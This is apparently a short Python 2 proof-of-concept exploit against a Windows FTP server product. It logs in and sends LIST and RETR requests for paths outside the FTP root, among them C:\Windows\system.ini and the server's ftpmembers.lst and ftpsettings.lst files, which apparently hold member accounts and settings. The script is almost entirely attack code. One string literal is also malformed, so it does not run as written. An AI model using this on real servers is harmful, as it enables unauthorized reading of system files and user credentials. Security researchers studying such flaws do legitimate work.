from ftplib import FTP
import sys

HOST = '192.168.36.55' #host
PORT = 21 #port

USER = 'test' #username
PASS = 'test' #password

ftp = FTP()

try:
    ftp.connect(HOST, PORT)
except:
    print 'Unable to connect to: %s:%d' %(HOST, PORT)
    sys.exit(-1)

print ftp.getwelcome()

try:
    ftp.login(USER, PASS)
except:
    print 'Login incorrect!'
    sys.exit(-1)

ftp.set_pasv(False)

for i in range(4):
    if i == 0:
        raw_input("\nLIST C:\Proga~1\Home Series [enter]")
        request = 'LIST C:\Progra~1\"Home Series"\'
    if i == 1:
        raw_input("\nRETR C:\Windows\system.ini [enter]")
        request = 'RETR C:\Windows\system.ini'
    elif i == 2:
        raw_input("\nRETR ftpmembers.lst [enter]")
        request = 'RETR ftpmembers.lst'
    elif i == 3:
        raw_input("\nRETR ftpsettings.lst [enter]")
        request = 'RETR ftpsettings.lst'
    try:
        ftp.retrlines(request)
    except:
        continue

ftp.close()

raw_input("\nbye [enter]")

#EoF 
